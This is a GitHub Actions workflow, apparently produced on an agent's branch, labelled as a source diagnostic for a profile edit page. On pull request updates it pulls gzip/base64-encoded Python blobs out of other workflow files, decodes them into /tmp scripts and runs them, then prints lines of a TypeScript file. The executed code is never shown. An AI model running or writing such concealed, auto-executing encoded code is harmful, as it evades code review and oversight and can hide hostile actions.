name: PR24 edit surface source diagnostic

on:
  pull_request:
    branches:
      - agent/profile-friends-privacy-ux
    types:
      - synchronize

# Trigger the local-first validation workflow now present on the branch.

jobs:
  source-diagnostic:
    if: github.head_ref == 'agent/pr24-social-profile-edit-surface-validation'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
        with:
          ref: ${{ github.event.pull_request.head.ref }}
      - name: Apply generated correction and print social save flow
        shell: bash
        run: |
          python - <<'PY'
          import base64, gzip, re
          from pathlib import Path
          initial = Path('.github/workflows/pr24-edit-surface-validation.yml').read_text()
          main = re.search(r"printf '%s' '(H4sI[^']+)'", initial)
          Path('/tmp/main.py').write_bytes(gzip.decompress(base64.b64decode(main.group(1))))
          final = Path('.github/workflows/pr24-edit-surface-final-validation.yml').read_text()
          for index, payload in enumerate(re.findall(r"printf '%s' '(H4sI[^']+)'", final), start=1):
              Path(f'/tmp/followup-{index}.py').write_bytes(gzip.decompress(base64.b64decode(payload)))
          browser = Path('.github/workflows/pr24-edit-surface-browser-validation.yml').read_text()
          payload = re.findall(r"printf '%s' '(H4sI[^']+)'", browser)[-1]
          Path('/tmp/followup-3.py').write_bytes(gzip.decompress(base64.b64decode(payload)))
          PY
          python /tmp/main.py
          python /tmp/followup-1.py
          python /tmp/followup-2.py
          python /tmp/followup-3.py
          line=$(grep -n "const submitIdentity" src/features/friends/pages/FriendsPrivacyPage.tsx | cut -d: -f1)
          start=$((line - 15))
          end=$((line + 155))
          nl -ba src/features/friends/pages/FriendsPrivacyPage.tsx | sed -n "${start},${end}p"
